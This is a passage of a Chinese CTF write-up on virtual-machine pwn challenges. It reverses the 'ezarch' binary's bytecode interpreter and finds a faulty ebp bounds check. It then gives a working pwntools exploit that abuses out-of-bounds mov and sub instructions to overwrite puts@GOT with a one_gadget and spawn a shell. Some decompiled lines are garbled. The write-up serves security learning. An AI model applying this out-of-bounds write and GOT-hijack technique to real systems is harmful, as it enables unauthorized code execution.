                while ( v9 mem + v9);
                  if ( v17 - v9 > 0xFFF )
                  {
                    v10 = read(0, v11, 0x1000uLL);
                    if ( v10 ");
                v12 = &con->_eip;
                __isoc99_scanf("%u", &con->_eip);
                printf("esp>", v12);
                v13 = &con->_esp;
                __isoc99_scanf("%u", &con->_esp);
                printf("ebp>", v13);
                __isoc99_scanf("%u", &con->_ebp);
                a2 = (char **)con;
                v14 = (unsigned __int64)&con->breakpoints[2];
                v15 = (signed int)con;
                *(_QWORD *)con->breakpoints = -1LL;
                a2[130] = (char *)-1LL;
                memset((void *)(v14 & 0xFFFFFFFFFFFFFFF8LL), 0xFFu, 8 * ((v15 - (v14 & 0xFFFFFFF8) + 1048) >> 3));
                memset(&unk_2020C0, 0, 0x1000uLL);
                *((_DWORD *)a2 + 4) = 4096;
                a2[1] = (char *)&unk_2020C0;
              }
            }
接下来分析Run函数，此函数负责vm解析字节码，采用switch循环结构，每次循环字节码迁移10B，可以发现是固定长度字节码。
opcode格式如下：
    10字节的opline结构
    +0x0  opcode
    +0x1  type位，标记操作数的类型，高4位代表操作数2类型，低四位代表操作数1类型
    +0x2  4字节操作数1
    +0x6  4字节操作数2
    操作数类型 0 寄存器变量 R0-R15  16=ESP  17=EBP
    操作数类型 1 立即数
    操作数类型 2 取地址值
函数中一下判断出错，导致可以越界读写内存。
    if ( _eip >= mem_size || (unsigned int)a1->_esp >= a1->stack_size || mem_size _ebp )
        return 1LL;
mem_size可以控制，并且stack_size固定为0x1000，当ebp偏移大于0x1000(stack地址距离bss段距离0x1000)时，由于stack位于bss段上方，可以越界读写到bss段，进而读写到libc地址段。
利用过程主要利用三个功能就可以，add,sub,mov指令即可。
解析一个mov的部分指令，如下：
    case 3:
          judge_2 = *(_BYTE *)(v4 + 1) >> 4;//首先解析操作数2 type类型
          if ( judge_2 == 1 )//type = 1 立即数
          {
            num_2 = *(_DWORD *)(v4 + 6);
          }
          else if ( judge_2 R[v45];
            }
            else if ( (_DWORD)v45 == 16 )
            {
              num_2 = a1->_esp;
            }
            else
            {
              if ( (_DWORD)v45 != 17 )
                return 1LL;
              num_2 = a1->_ebp;
            }
          }
          else
          {
            if ( judge_2 != 2 )//type = 2 ，对应取地址
              return 1LL;
            v42 = *(unsigned int *)(v4 + 6);
            if ( (unsigned int)v42 mem + (unsigned int)a1->R[v42] % a1->mem_size);
            }
            else if ( (_DWORD)v42 == 16 )
            {
              num_2 = *(_DWORD *)(a1->stack + (unsigned int)a1->_esp);
            }
            else
            {
              if ( (_DWORD)v42 != 17 )
                return 1LL;
              num_2 = *(_DWORD *)(a1->stack + (unsigned int)a1->_ebp);
            }
          }
          if ( *(_BYTE *)(v4 + 1) & 0xF )//操作数1 type类型
          {
            if ( (*(_BYTE *)(v4 + 1) & 0xF) != 2 )
              return 1LL;
            v44 = *(unsigned int *)(v4 + 2);
            if ( (unsigned int)v44 mem + (unsigned int)a1->R[v44] % a1->mem_size) = num_2;
              v16 = a1->_eip;
            }
            else if ( (_DWORD)v44 == 16 )
            {
              *(_DWORD *)(a1->stack + (unsigned int)a1->_esp) = num_2;
              v16 = a1->_eip;
            }
            else
            {
              if ( (_DWORD)v44 != 17 )
                return 1LL;
              *(_DWORD *)(a1->stack + (unsigned int)a1->_ebp) = num_2;
              v16 = a1->_eip;
            }
          }
          else
          {
            v46 = *(unsigned int *)(v4 + 2);
            if ( (unsigned int)v46 R[v46] = num_2;
              v16 = a1->_eip;
            }
            else if ( (_DWORD)v46 == 16 )
            {
              a1->_esp = num_2;
              v16 = a1->_eip;
            }
            else
            {
              if ( (_DWORD)v46 != 17 )
                return 1LL;
              a1->_ebp = num_2;
              v16 = a1->_eip;
            }
          }
          goto LABEL_26;
###  利用过程
通过调试我们一直VM stack位于bss段上方0x1000处，而且由于Run函数中对于判断条件设置有误，导致我们可以越界读写内存。
因此，我们利用思路如下：
  1. 利用越界读写，使用mov将bss段地址写到vm 寄存器中。
  2. 由于got表可写，利用sub功能，将vm寄存器中的bss段地址，减去对应偏移，对应到puts_got。
  3. 利用mov功能，将stack的地址改为puts_got地址。
  4. 利用mov功能，将puts_got地址对应的libc地址地位赋给vm寄存器
  5. 然后利用sub功能，减去偏移得到对应的one_gadget地址。
  6. 利用mov功能，覆盖puts_got为one_gadget地址，get shell。
调试一下vm stack地址以及大小
    pwndbg> x/20xg $node
    0x5555557570c0: 0x0000555555759010      0x00005555557560c0 # stack位于bss上方0x1000处
    0x5555557570d0: 0x0000300000001000      0xffffffffffffffff # stack地址大小为0x1000
    0x5555557570e0: 0xffffffffffffffff      0xffffffffffffffff
    0x5555557570f0: 0xffffffffffffffff      0xffffffffffffffff
    0x555555757100: 0xffffffffffffffff      0xffffffffffffffff
    0x555555757110: 0xffffffffffffffff      0xffffffffffffffff
    0x555555757120: 0xffffffffffffffff      0xffffffffffffffff
    0x555555757130: 0xffffffffffffffff      0xffffffffffffffff
    0x555555757140: 0xffffffffffffffff      0xffffffffffffffff
    0x555555757150: 0xffffffffffffffff      0xffffffffffffffff
    pwndbg> x/20xg $R
    0x5555557574d8: 0x0000000000000000      0x0000000000000000
    0x5555557574e8: 0x0000000000000000      0x0000000000000000
    0x5555557574f8: 0x0000000000000000      0x0000000000000000
    0x555555757508: 0x0000000000000000      0x0000000000000000
    0x555555757518: 0x0000000000000000      0x0000000000001008
    0x555555757528: 0x0000000000000000      0x0000000000000000
    0x555555757538: 0x0000000000000000      0x0000000000000000
    0x555555757548: 0x0000000000000000      0x0000000000000000
    0x555555757558: 0x0000000000000000      0x0000000000000000
exp如下，利用过程参照注释，试环境ubuntu 16.04：
    #https://github.com/matrix1001/welpwn
    from PwnContext import *
    try:
        from IPython import embed as ipy
    except ImportError:
        print ('IPython not installed.')
    if __name__ == '__main__':        
        context.terminal = ['tmux', 'splitw', '-h']
        context.log_level = 'debug'
        # functions for quick script
        s       = lambda data               :ctx.send(str(data))        #in case that data is an int
        sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
        sl      = lambda data               :ctx.sendline(str(data)) 
        sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
        r       = lambda numb=4096          :ctx.recv(numb)
        ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
        irt     = lambda                    :ctx.interactive()
        rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
        dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
        # misc functions
        uu32    = lambda data   :u32(data.ljust(4, ''))
        uu64    = lambda data   :u64(data.ljust(8, ''))
        ctx.binary = './ezarch'
        #ctx.custom_lib_dir = '/home/iddm/glibc-all-in-one/libs/2.27-3ubuntu1_amd64'
        #ctx.remote = ('172.16.9.21', 9006)
        #ctx.debug_remote_libc = True
        ctx.symbols = {
            'node':0x2030C0,
            'R':0x2030c0+0x418
        }
        ctx.breakpoints = [0xfd0]#menu
        def lg(s,addr):
            print('33[1;31;40m%20s-->0x%x33[0m'%(s,addr))
        def init(size,init_size,memory,eip,esp,ebp):
            sla('[E]xitn>','M')
            sla('Memory size>',size)
            sla('size>',init_size)
            sa('Input Memory Now',memory)
            sla('eip>',eip)
            sla('esp>',esp)
            sla('ebp>',ebp)
        def sub(type,op1,op2):
            return 'x02'+type+p32(op1)+p32(op2)
        def mov(type,op1,op2):
            return 'x03'+type+p32(op1)+p32(op2)
        rs()
        dbg()
        payload = ''
        #mov R[0],*(stack+ebp)
        payload += mov('x20',0,17)
        #sub R[0],0xa0
        payload += sub('x10',0,0xa0)
        #mov *(stack+ebp),R[0]
        payload += mov('x02',17,0)
        #mov R[0],*(stack+esp)
        payload += mov('x20',0,16)
        #sub R[0],offset
        payload += sub('x10',0,0x2a47a)
        #mov *(stack+esp),R[0]
        payload += mov('x02',16,0)
        init(0x3000,len(payload),payload,0,0,0x1008)
        sla('[E]xitn>','R')
        irt()
## 2019-redhatfinal-pwn3
此题并非模拟了vm行为，而单纯的自己设计指令，并根据规则解析输入的内容。
指令逻辑还是比较繁多的，逆向清楚已经是下午了，做出来以后没得几次分就比赛结束了。
之前写过这篇的wp，移步[链接](https://bbs.pediy.com/thread-255782.htm)。
## 总结
2019年ciscn初赛的时候有一道比较简单的虚拟指令集pwn，如果觉得上述有些困难的话，可以先从这里入门体验一下，推荐一个[文章](//23r3f.github.io/2019/04/23/2019%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B/#virtual)),感兴趣可以去看一下。
上面分析了三道题目，前两道属于第一类，模拟VM行为pwn；第三道属于虚拟指令集pwn，单纯解析输入执行指令。
通过上面三道题目，可以发现这类题目代码量一般较大，逆向难度偏高，就像[m4p1e](http://wiki.m4p1e.com/article/getById/67)师傅介绍的，我们对于此类题目应该搞清楚的主要有几个地方：
  1. 题目过程当中的指令集有哪些。
  2. 每个指令解析过程具体是如何进行的。
在逆向过程中带着这个意识去分析，对于可以读写内存的指令着重关注，并且一般解题并不需要全部的指令，出题人可能为了加大难度加了些多余的指令，特别对于线下赛时，可以边分析边解题，解题脚本写不下去时继续分析，这样对于线下赛先解题得分高的环境下是比较有利的，吸取我当初的教训。
## Refferings: